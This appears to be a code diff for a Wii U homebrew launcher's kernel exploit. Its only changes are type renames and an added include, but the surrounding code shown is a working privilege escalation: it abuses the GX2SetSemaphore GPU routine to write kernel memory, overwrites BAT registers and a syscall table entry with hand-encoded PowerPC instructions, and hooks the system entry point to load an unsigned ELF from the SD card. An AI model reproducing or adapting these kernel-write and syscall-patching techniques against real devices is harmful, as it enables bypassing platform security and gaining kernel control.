@@ -1,5 +1,6 @@
 #include <coreinit/core.h>
 #include <coreinit/memory.h>
+#include <coreinit/memorymap.h>
 #include <coreinit/debug.h>
 #include <coreinit/thread.h>
 #include <coreinit/cache.h>
@@ -63,7 +64,7 @@
 #define address_gDynloadInitialized                 0xEFE13DBC
 
 #define NOP_ADDR(addr) \
-        *(u32*)addr = 0x60000000; \
+        *(uint32_t*)addr = 0x60000000; \
         asm volatile("dcbf 0, %0; icbi 0, %0" : : "r" (addr & ~31));
 
 
@@ -114,18 +115,18 @@ static void __attribute__((noinline)) kern_write(const void *addr, uint32_t valu
 
 int exploitThread(int argc, char **argv)
 {
-	OSDynLoadModule gx2_handle;
+	OSDynLoad_Module gx2_handle;
 	OSDynLoad_Acquire("gx2.rpl", &gx2_handle);
 
 	void (*pGX2SetSemaphore)(uint64_t *sem, int action);
 	OSDynLoad_FindExport(gx2_handle, 0, "GX2SetSemaphore", (void**)&pGX2SetSemaphore);
 	uint32_t set_semaphore = ((uint32_t)pGX2SetSemaphore) + 0x2C;
 
-	u32 gx2_init_attributes[9];
-	u8 *gx2CommandBuffer = (u8*)memalign(0x40, 0x400000);
+	uint32_t gx2_init_attributes[9];
+	uint8_t *gx2CommandBuffer = (uint8_t*)memalign(0x40, 0x400000);
 
     gx2_init_attributes[0] = 1;
-    gx2_init_attributes[1] = (u32)gx2CommandBuffer;
+    gx2_init_attributes[1] = (uint32_t)gx2CommandBuffer;
     gx2_init_attributes[2] = 2;
     gx2_init_attributes[3] = 0x400000;
     gx2_init_attributes[4] = 7;
@@ -200,7 +201,7 @@ static void setup_syscall(void)
     asm volatile("mtspr 571, %0" : : "r" (0xFFF00032));
     asm volatile("eieio; isync");
 
-    u32 *targetAddress = (u32*)BAT_SETUP_HOOK_ADDR;
+    uint32_t *targetAddress = (uint32_t*)BAT_SETUP_HOOK_ADDR;
     targetAddress[0] = 0x3ce00000 | ((BAT4L_VAL >> 16) & 0xFFFF);   // lis r7, BAT4L_VAL@h
     targetAddress[1] = 0x60e70000 | (BAT4L_VAL & 0xFFFF);           // ori r7, r7, BAT4L_VAL@l
     targetAddress[2] = 0x7cf18ba6;                                  // mtspr 561, r7
@@ -210,7 +211,7 @@ static void setup_syscall(void)
     targetAddress[6] = 0x7c0006ac;                                  // eieio
     targetAddress[7] = 0x4c00012c;                                  // isync
     targetAddress[8] = 0x7ce802a6;                                  // mflr r7
-    targetAddress[9] = 0x48000003 | (u32)BAT_SETUP_HOOK_ENTRY;      // bla BAT_SETUP_HOOK_ENTRY
+    targetAddress[9] = 0x48000003 | (uint32_t)BAT_SETUP_HOOK_ENTRY;      // bla BAT_SETUP_HOOK_ENTRY
     asm volatile("dcbf 0, %0; icbi 0, %0; sync" : : "r" (BAT_SETUP_HOOK_ADDR & ~31));
     asm volatile("dcbf 0, %0; icbi 0, %0; sync" : : "r" ((BAT_SETUP_HOOK_ADDR + 0x20) & ~31));
 
@@ -222,8 +223,8 @@ static void setup_syscall(void)
     NOP_ADDR(BAT_SET_NOP_ADDR_6);
     NOP_ADDR(BAT_SET_NOP_ADDR_7);
 
-    u32 addr_syscall_0x65 = *(u32*)(KERN_SYSCALL_TBL_2 + 0x65 * 4);
-    *(u32*)addr_syscall_0x65 = 0x3C60B00B; // lis r3, 0xB00B
+    uint32_t addr_syscall_0x65 = *(uint32_t*)(KERN_SYSCALL_TBL_2 + 0x65 * 4);
+    *(uint32_t*)addr_syscall_0x65 = 0x3C60B00B; // lis r3, 0xB00B
     asm volatile("dcbf 0, %0; icbi 0, %0; sync" : : "r" (addr_syscall_0x65 & ~31));
 
     asm volatile("eieio; isync");
@@ -304,13 +305,13 @@ static unsigned int load_loader_elf(unsigned char* baseAddress)
 
 int CheckKernelExploit(void)
 {
-    if(OSEffectiveToPhysical((void*)0xA0000000) == 0x10000000)
+    if(OSEffectiveToPhysical(0xA0000000) == 0x10000000)
     {
         log_printf("Running kernel setup\n");
 
         unsigned char backupBuffer[0x40];
 
-        u32 *targetAddress = (u32*)(0xA0000000 + (0x327FF000 - 0x10000000));
+        uint32_t *targetAddress = (uint32_t*)(0xA0000000 + (0x327FF000 - 0x10000000));
         memcpy(backupBuffer, targetAddress, sizeof(backupBuffer));
 
         targetAddress[0] = 0x7c7082a6;                          // mfspr r3, 528
@@ -321,21 +322,21 @@ int CheckKernelExploit(void)
         targetAddress[5] = 0x7c7283a6;                          // mtspr 530, r3
         targetAddress[6] = 0x7c0006ac;                          // eieio
         targetAddress[7] = 0x4c00012c;                          // isync
-        targetAddress[8] = 0x3c600000 | (((u32)setup_syscall) >> 16);     // lis r3, setup_syscall@h
-        targetAddress[9] = 0x60630000 | (((u32)setup_syscall) & 0xFFFF);  // ori r3, r3, setup_syscall@l
+        targetAddress[8] = 0x3c600000 | (((uint32_t)setup_syscall) >> 16);     // lis r3, setup_syscall@h
+        targetAddress[9] = 0x60630000 | (((uint32_t)setup_syscall) & 0xFFFF);  // ori r3, r3, setup_syscall@l
         targetAddress[10] = 0x7c6903a6;                         // mtctr   r3
         targetAddress[11] = 0x4e800420;                         // bctr
         DCFlushRange(targetAddress, sizeof(backupBuffer));
 
-        u8 *sdLoaderAddress = (u8*)(0xA0000000 + (0x30000000 - 0x10000000));
-        u32 entryPoint = load_loader_elf(sdLoaderAddress);
+        uint8_t *sdLoaderAddress = (uint8_t*)(0xA0000000 + (0x30000000 - 0x10000000));
+        uint32_t entryPoint = load_loader_elf(sdLoaderAddress);
 
         sdLoaderAddress += BAT_SETUP_HOOK_ENTRY;
 
         //! set HBL version as channel version
-        *(u32*)(sdLoaderAddress + HBL_CHANNEL_OFFSET) = HBL_VERSION_INT;
+        *(uint32_t*)(sdLoaderAddress + HBL_CHANNEL_OFFSET) = HBL_VERSION_INT;
         //! OS_FIRMWARE -> 550 on 5.5.x specific addresses
-        *(u32*)(sdLoaderAddress + OS_FIRMWARE_OFFSET) = 550;
+        *(uint32_t*)(sdLoaderAddress + OS_FIRMWARE_OFFSET) = 550;
 
         OsSpecifics *osSpecificFunctions = (OsSpecifics *)(sdLoaderAddress + 0x1500);
         osSpecificFunctions->addr_OSDynLoad_Acquire = (unsigned int)OSDynLoad_Acquire;
@@ -371,7 +372,7 @@ int CheckKernelExploit(void)
         DCFlushRange(targetAddress, sizeof(backupBuffer));
 
         unsigned int repl_addr = ADDRESS_main_entry_hook;
-        *(u32*)(0xC1000000 + repl_addr) = 0x48000003 | entryPoint;
+        *(uint32_t*)(0xC1000000 + repl_addr) = 0x48000003 | entryPoint;
         DCFlushRange((void*)0xC1000000 + repl_addr, 4);
         ICInvalidateRange((void*)(repl_addr), 4);
 
@@ -390,7 +391,7 @@ int CheckKernelExploit(void)
         log_printf("Running GX2Sploit\n");
         /* Make a thread to modify the semaphore */
         OSThread *thread = (OSThread*)memalign(8, 0x1000);
-        u8 *stack = (u8*)memalign(0x40, 0x2000);
+        uint8_t *stack = (uint8_t*)memalign(0x40, 0x2000);
 
         if (OSCreateThread(thread, (OSThreadEntryPointFn)exploitThread, 0, NULL, stack + 0x2000, 0x2000, 0, 0x1) == 0)
         {
